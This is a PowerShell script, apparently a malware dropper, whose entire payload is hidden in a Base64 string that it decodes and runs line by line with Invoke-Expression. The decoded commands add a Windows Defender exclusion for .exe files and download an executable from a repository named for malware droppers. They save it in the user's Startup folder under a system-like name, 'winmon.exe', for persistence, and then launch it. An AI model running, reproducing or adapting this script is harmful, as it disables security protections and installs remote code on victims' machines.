
function Decode-Text {
    [CmdletBinding()]
    param([Parameter(Mandatory=$true, ValueFromPipeline=$true)][string]$Text)
    $bytes = [System.Convert]::FromBase64String($Text)
    $decodedText = [System.Text.Encoding]::UTF8.GetString($bytes)
    return $decodedText
}

$enc_text = "IyBFbmFibGUgVExTdjEuMiBmb3IgY29tcGF0aWJpbGl0eSB3aXRoIG9sZGVyIGNsaWVudHMNCltTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciBbU3lzdGVtLk5ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyDQpBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25FeHRlbnNpb24gIi5leGUiDQokRG93bmxvYWRVUkwgPSAnaHR0cHM6Ly9naXRodWIuY29tL1JhdmlOYXl5YXIvcHNfbWFsd2FyZV9kcm9wcGVyL2Jsb2IvbWFpbi9tdy93bS5leGU/cmF3PXRydWUnDQokRmlsZVBhdGggPSAiQzpcVXNlcnNcIiskZW52OlVzZXJOYW1lKyJcQXBwRGF0YVxSb2FtaW5nXE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cFx3aW5tb24uZXhlIg0KSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkRG93bmxvYWRVUkwgLVVzZUJhc2ljUGFyc2luZyAtT3V0RmlsZSAkRmlsZVBhdGggLUVycm9yQWN0aW9uIFN0b3ANCiNOZXctU2VydmljZSAtTmFtZSAiVGVzdFNlcnZpY2UiIC1CaW5hcnlQYXRoTmFtZSAkRmlsZVBhdGggLURpc3BsYXlOYW1lICJUZXN0IFNlcnZpY2UiIC1TdGFydHVwVHlwZSAiQXV0b21hdGljIiAtRGVzY3JpcHRpb24gIlRoaXMgaXMgYSB0ZXN0IHNlcnZpY2UuIg0KI1NldC1TZXJ2aWNlIC1OYW1lIFRlc3RTZXJ2aWNlIC1TdGF0dXMgUnVubmluZw0KJEZpbGVQYXRoID0gJyInKyRGaWxlUGF0aCsnIicNClN0b3AtUHJvY2VzcyAtTmFtZSB3aW5tb24NClN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICRGaWxlUGF0aCAtTm9OZXdXaW5kb3cNCg=="

$decodedText = Decode-Text $enc_text
$lines = $decodedText -split "`n"
foreach($line in $lines) {Invoke-Expression $line}
